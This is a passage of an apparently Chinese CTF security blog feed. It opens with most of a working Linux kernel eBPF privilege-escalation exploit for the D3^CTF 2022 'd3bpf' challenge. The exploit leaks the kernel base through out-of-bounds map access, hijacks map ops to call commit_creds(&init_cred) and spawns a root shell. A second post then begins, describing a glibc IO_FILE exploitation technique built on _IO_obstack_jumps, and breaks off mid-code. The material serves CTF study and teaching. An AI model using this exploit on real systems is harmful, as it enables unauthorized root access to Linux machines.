class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOB_REG BPF_REG_7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STORE_REG BPF_REG_6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(oob_map_fd, store_map_fd)                                     \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),                                    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(OOB_REG, BPF_REG_0),                                   \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),                              \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(STORE_REG, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 64),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                                           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9),                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG),                                   \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),                             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),                          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> oob_map_fd, <span class="keyword">int</span> store_map_fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0xD0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">8</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = oob_map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ((<span class="keyword">uint64_t</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(read_map_ops_content[<span class="number">0</span>]), &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// save_status();</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> store_map_fd = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> oob_map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (store_map_fd &lt; <span class="number">0</span> || oob_map_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops, <span class="keyword">sizeof</span>(read_map_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> array_map_ops = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path_addr = <span class="number">0x1a6c240</span> + kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path =&gt; %p\n&quot;</span>, modprobe_path_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span> - <span class="number">0xc0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr, <span class="keyword">sizeof</span>(read_map_addr) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_ptr = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gap =&gt; %p\n&quot;</span>, (modprobe_path_addr - map_ptr));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x79706f432f00</span></span><br><span class="line"></span><br><span class="line">    read_kernel(oob_map_fd, store_map_fd, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(values + <span class="number">8</span> * <span class="number">4</span>)) = work_for_cpu_fn_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get_ops!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x20</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x28</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x28</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x30</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ops[<span class="number">4</span>] = commit_creds_addr;</span><br><span class="line">    ops[<span class="number">5</span>] = init_creds_addr;</span><br><span class="line">    ops[<span class="number">6</span>] = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, ops, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] updated oob_map&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = oob_map_fd,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230106194449337.png"                      alt="image-20230106194449337"                ></p><hr><p>题目放在: <a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>house of lalala</title>
    <link href="https://cv196082.gitee.io/2022/12/01/house-of-lalala/"/>
    <id>https://cv196082.gitee.io/2022/12/01/house-of-lalala/</id>
    <published>2022-12-01T05:45:58.000Z</published>
    <updated>2022-12-01T05:45:28.861Z</updated>
    
    <content type="html"><![CDATA[<p>近期又出现一个新的关于<code>IO_FILE</code>的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>此次聚焦的vtable表为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要利用的结构体为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是在<code>IO_FILE</code>结构体下加一个<code>obstack</code>结构体指针。下面则是<code>obstack</code>结构体的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="keyword">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="keyword">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="keyword">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="keyword">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="keyword">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="keyword">void</span> (*freefun) (<span class="keyword">void</span> *, struct _obstack_chunk *);</span><br><span class="line">  <span class="keyword">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="keyword">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="keyword">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，上述的vtable中只有<code>_IO_obstack_overflow</code>、<code>_IO_obstack_xsputn</code>这样两个函数，首先关注前一个</p><h3 id="IO-obstack-overflow"><a href="#IO-obstack-overflow" class="headerlink" title="_IO_obstack_overflow"></a>_IO_obstack_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_IO_obstack_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);</span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  